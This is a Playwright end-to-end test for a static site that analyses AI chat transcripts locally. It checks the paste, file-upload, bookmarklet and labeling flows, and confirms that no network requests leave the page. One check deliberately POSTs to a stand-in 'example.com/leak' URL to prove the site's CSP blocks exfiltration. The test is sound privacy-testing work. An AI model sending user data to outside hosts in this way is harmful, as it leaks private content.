// Browser end-to-end check of the static site (optional; needs Playwright + Chromium).
//   PWPATH=$(npm root -g)/playwright node tests/e2e/site_e2e.mjs
// Serves site/ and the fake share pages on two different origins.
import { createRequire } from "node:module";
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const require = createRequire(import.meta.url);
const { chromium } = require(process.env.PWPATH || "playwright");
const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(here, "../..");
const TYPES = { ".html": "text/html; charset=utf-8", ".js": "text/javascript", ".css": "text/css", ".json": "application/json", ".woff2": "font/woff2" };

function serve(dir, port) {
  return new Promise((resolve) => {
    const srv = http.createServer((req, res) => {
      const p = path.join(dir, decodeURIComponent(new URL(req.url, "http://x").pathname).replace(/\/$/, "/index.html"));
      fs.readFile(p, (err, data) => {
        if (err) { res.writeHead(404); return res.end(); }
        res.writeHead(200, { "content-type": TYPES[path.extname(p)] || "application/octet-stream" });
        res.end(data);
      });
    }).listen(port, "127.0.0.1", () => resolve(srv));
  });
}

const fails = [];
const check = (cond, msg) => { console.log(`${cond ? "PASS" : "FAIL"}  ${msg}`); if (!cond) fails.push(msg); };

const site = await serve(path.join(root, "site"), 8800);
const share = await serve(path.join(here, "fake_share"), 8801);
const SITE = "http://127.0.0.1:8800/";
const browser = await chromium.launch();
const ctx = await browser.newContext();
const errors = [];

// 1. paste -> analyze, with zero network requests after the page loaded
{
  const page = await ctx.newPage();
  page.on("pageerror", (e) => errors.push(e.message));
  await page.goto(SITE);
  await page.waitForLoadState("networkidle");
  const requests = [];
  page.on("request", (r) => requests.push(r.url()));
  await page.click("#sample");
  await page.click("#go");
  await page.waitForSelector("#result:not([hidden]) svg");
  check(requests.length === 0, `paste analysis made ${requests.length} network requests`);
  const violation = await page.evaluate(() => new Promise((resolve) => {
    document.addEventListener("securitypolicyviolation", (e) => resolve(e.effectiveDirective), { once: true });
    fetch("https://example.com/leak", { method: "POST", body: "x" }).catch(() => {});
    setTimeout(() => resolve(null), 2000);
  }));
  check(violation === "connect-src", `CSP itself blocks outbound fetch (violation: ${violation})`);
  check(await page.isVisible("text=Download skeleton (JSON)"), "download button shown");
  check((await page.textContent("#result")).includes("g CO₂"), "result shows the carbon estimate");
  check(await page.locator("#weight .forest .tree").count() === 25, "carbon story renders 25 tree-years");
  check((await page.textContent("#weight .mega")).includes("10.8") || (await page.getAttribute("#weight .mega-n", "data-count")) === "10.8", "carbon story headline is 10.8 g");
  check((await page.locator("#weight .sources li").count()) >= 5, "carbon story cites its sources");
  // link input gives bookmarklet guidance instead of fetching
  await page.fill("#input", "https://chatgpt.com/share/abc");
  await page.click("#go");
  check((await page.textContent("#error")).includes("share link"), "share link input shows bookmarklet guidance");
  check(requests.length === 0, "still no network requests after link input");
  await page.close();
}

// 2. file upload (ChatGPT export JSON)
{
  const page = await ctx.newPage();
  await page.goto(SITE);
  const exportJson = JSON.stringify([{ current_node: "b", mapping: {
    a: { message: { author: { role: "user" }, content: { parts: ["explain git rebase vs merge"] } }, parent: null, children: ["b"] },
    b: { message: { author: { role: "assistant" }, content: { parts: ["Rebase rewrites history; merge keeps it."] } }, parent: "a", children: [] },
  } }]);
  await page.setInputFiles("#file", { name: "conversations.json", mimeType: "application/json", buffer: Buffer.from(exportJson) });
  await page.click("#go");
  await page.waitForSelector("#result:not([hidden]) svg");
  check(true, "export JSON file analyzed");
  await page.close();
}

// 3. bookmarklet on fake share pages (different origin) -> site tab
const sitePage = await ctx.newPage();
await sitePage.goto(SITE);
const href = await sitePage.getAttribute("#bookmarklet", "href");
const code = decodeURIComponent(href.replace(/^javascript:/, ""));
for (const [file, expectTurns] of [["chatgpt.html", 6], ["claude.html", 4], ["gemini.html", 2], ["plain.html", 2]]) {
  const page = await ctx.newPage();
  await page.goto(`http://127.0.0.1:8801/${file}`);
  const [popup] = await Promise.all([ctx.waitForEvent("page"), page.evaluate(code)]);
  const requests = [];
  popup.on("request", (r) => { if (!r.url().startsWith(SITE)) requests.push(r.url()); });
  popup.on("pageerror", (e) => errors.push(`${file}: ${e.message}`));
  await popup.waitForSelector("#result:not([hidden]) svg", { timeout: 10000 });
  const turns = await popup.locator("#result svg circle, #result svg rect").count();
  check(turns === expectTurns, `${file}: bookmarklet handed over ${turns}/${expectTurns} turns`);
  check(!popup.url().includes("#pxt="), `${file}: conversation removed from the URL`);
  check(requests.length === 0, `${file}: no requests outside the site`);
  await popup.close();
  await page.close();
}

// 4. labeling page: load a packet, label, export; nothing leaves the tab
{
  const lctx = await browser.newContext({ acceptDownloads: true });
  const page = await lctx.newPage();
  page.on("pageerror", (e) => errors.push(`label: ${e.message}`));
  await page.goto(SITE + "label.html");
  await page.waitForLoadState("networkidle");
  const requests = [];
  page.on("request", (r) => requests.push(r.url()));
  const item = (id) => ({ id, session: "S01", index: 0, instruction: "secret instruction text", steps: [{ tool: "Read", target: "a.py", result_chars: 10, error: false }], final: "done", stats: { calls: 1, input: 10, output: 1, errors: 0, subagents: 0 } });
  const packet = { schema: "pickaxetax.labelpacket.v1", codebook: "v1", seed: 1, population: { sessions: 1, instructions: 3 }, calibration: [item("c1")], items: [item("m1"), item("m2")], sha256: "f".repeat(64) };
  await page.setInputFiles("#packet", { name: "packet.json", mimeType: "application/json", buffer: Buffer.from(JSON.stringify(packet)) });
  await page.fill("#coder", "A");
  await page.click("#start");
  for (const c of ["W1", "W2", "W3", "W4", "W5", "W6", "W7", "W8"]) await page.check(`#${c}-no`);
  await page.check("#outcome-met");
  const [dl] = await Promise.all([page.waitForEvent("download"), page.click("#export")]);
  const out = JSON.parse(fs.readFileSync(await dl.path(), "utf8"));
  check(out.schema === "pickaxetax.labels.v1" && out.labels.c1 && out.labels.c1.W1 === "no", "labeling page exports the labels file");
  check(!JSON.stringify(out).includes("secret instruction"), "labels file holds no conversation text");
  check(requests.length === 0, `labeling made ${requests.length} network requests`);
  await lctx.close();
}

check(errors.length === 0, `no page errors ${errors.length ? JSON.stringify(errors) : ""}`);
await browser.close();
site.close();
share.close();
process.exit(fails.length ? 1 : 0);
